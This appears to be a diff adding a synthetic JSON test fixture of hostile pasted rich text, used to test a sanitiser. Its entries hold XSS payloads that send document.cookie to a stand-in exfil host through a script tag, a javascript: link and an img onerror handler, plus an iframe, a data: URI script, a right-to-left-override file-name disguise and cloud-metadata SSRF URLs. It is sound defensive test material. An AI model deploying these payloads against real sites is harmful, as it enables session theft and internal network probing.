@@ -1,0 +1,56 @@
+{
+  "$comment": [
+    "Hostile third-party rich text, for W14's sanitisation tests.",
+    "",
+    "Synthetic and entirely invented, like everything in fixtures/. It is written to",
+    "look like what a document tool actually hands back after somebody pastes from the",
+    "open web: markup, a javascript: link, a data: URI, control characters, and",
+    "bidirectional overrides that make a title render as something other than what it",
+    "is. docs/14-threat-model.md §2 boundary 5 — this content flows into rendering",
+    "AND into an agent's context, which is why 'it's the owner's own workspace' is not",
+    "a reason to trust it.",
+    "",
+    "Every entry is deliberately something a sanitiser could get wrong, not something",
+    "obviously bad. A test fixture of <script>alert(1)</script> and nothing else",
+    "proves only that the easy case is handled."
+  ],
+  "runs": [
+    {
+      "text": "Quarterly review <script>fetch('https://exfil.invalid/?c='+document.cookie)</script>",
+      "annotations": { "bold": true }
+    },
+    {
+      "text": " see the notes",
+      "href": "javascript:fetch('https://exfil.invalid/?c='+document.cookie)"
+    },
+    {
+      "text": " and the summary",
+      "href": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+    },
+    {
+      "text": " <img src=x onerror=\"fetch('https://exfil.invalid')\">"
+    },
+    {
+      "text": " <iframe src=\"https://evil.invalid\"></iframe>"
+    },
+    {
+      "$note": "U+202E RIGHT-TO-LEFT OVERRIDE and U+202C POP. Renders as 'Invoice exe.txt' in a UI and reads as something it is not.",
+      "text": "Invoice ‮txt.exe‬ pending"
+    },
+    {
+      "$note": "CR, NUL, BEL and ESC, escaped because raw control characters are not legal JSON. They arrive from a tool's API, not from a file anybody types — and the CR is the one that silently changes a content hash.",
+      "text": "line one\u0000line two\u0007\u001bbell and escape\r"
+    },
+    {
+      "text": " legitimate link https://docs.prisme.invalid/guide.",
+      "annotations": { "italic": true, "colour": "red", "onclick": true }
+    },
+    {
+      "text": " internal only http://localhost:5432/ and http://169.254.169.254/latest/meta-data/"
+    },
+    {
+      "text": "",
+      "annotations": { "bold": true }
+    }
+  ]
+}
